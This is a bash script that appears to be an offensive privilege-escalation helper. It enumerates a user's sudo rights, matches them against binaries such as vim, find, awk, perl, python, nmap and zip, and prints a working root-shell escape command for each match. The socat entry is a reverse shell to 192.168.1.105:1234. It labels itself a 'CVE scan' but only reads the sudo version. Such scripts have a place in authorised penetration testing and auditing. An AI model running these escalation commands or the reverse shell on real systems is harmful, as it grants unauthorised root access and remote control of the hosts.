#!/bin/bash

# Function to list sudo privileges
get_sudo_privileges() {
    echo "[*] Checking for sudo privileges..."
    sudo -l 2>/dev/null
}

# Function to parse dangerous sudo privileges
parse_dangerous_privileges() {
    dangerous_binaries=("vim" "awk" "nmap" "env" "perl" "python" "less" "man" "ftp" "find" "gcc" "zip" "socat")
    echo "[*] Parsing dangerous sudo privileges..."

    for binary in "${dangerous_binaries[@]}"; do
        if sudo -l | grep -q "$binary"; then
            echo "   - sudo abuse possible with $binary"
            generate_exploit "$binary"
        fi
    done
}

# Function to get the current sudo version
get_sudo_version() {
    echo "[*] Retrieving sudo version..."
    sudo --version | head -n 1 | awk '{print $3}'
}

# Function to generate exploitation examples
generate_exploit() {
    case $1 in
        vim) echo "   Exploit using vim: sudo vim -c ':!/bin/bash'" ;;
        find) echo "   Exploit using find: sudo find /etc/passwd -exec /bin/bash \;" ;;
        nmap) echo "   Exploit using nmap: echo 'os.execute(\"/bin/bash\")' > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse" ;;
        env) echo "   Exploit using env: sudo env /bin/bash" ;;
        awk) echo "   Exploit using awk: sudo awk 'BEGIN {system(\"/bin/bash\")}'" ;;
        perl) echo "   Exploit using perl: sudo perl -e 'exec \"/bin/bash\";'" ;;
        python) echo "   Exploit using python: sudo python -c 'import pty;pty.spawn(\"/bin/bash\")'" ;;
        less) echo "   Exploit using less: sudo less /etc/hosts - !bash" ;;
        man) echo "   Exploit using man: sudo man man - !bash" ;;
        ftp) echo "   Exploit using ftp: sudo ftp - ! /bin/bash" ;;
        socat) echo "   Exploit using socat:\n     Attacker: socat file:\`tty\`,raw,echo=0 tcp-listen:1234\n     Victim: sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234" ;;
        zip) echo "   Exploit using zip: echo test > notes.txt && sudo zip test.zip notes.txt -T --unzip-command='sh -c /bin/bash'" ;;
        gcc) echo "   Exploit using gcc: sudo gcc -wrapper /bin/bash,-s ." ;;
        *) echo "   No exploitation example available for $1." ;;
    esac
}

# Main function
main() {
    echo "[*] Starting sudo abuse and CVE scan..."

    # Step 1: Check sudo privileges
    sudo_privileges=$(get_sudo_privileges)
    if [[ -z "$sudo_privileges" ]]; then
        echo "[!] No sudo privileges found or unable to retrieve them."
        exit 1
    else
        echo "[+] Sudo privileges found:"
        echo "$sudo_privileges"
    fi

    # Step 2: Parse and identify potential sudo abuses
    parse_dangerous_privileges

    # Step 3: Get sudo version
    sudo_version=$(get_sudo_version)
    if [[ -n "$sudo_version" ]]; then
        echo "[+] Sudo version: $sudo_version"
    else
        echo "[!] Unable to retrieve sudo version."
    fi

    echo "[*] Sudo abuse and CVE scan completed."
}

# Run the main function
main
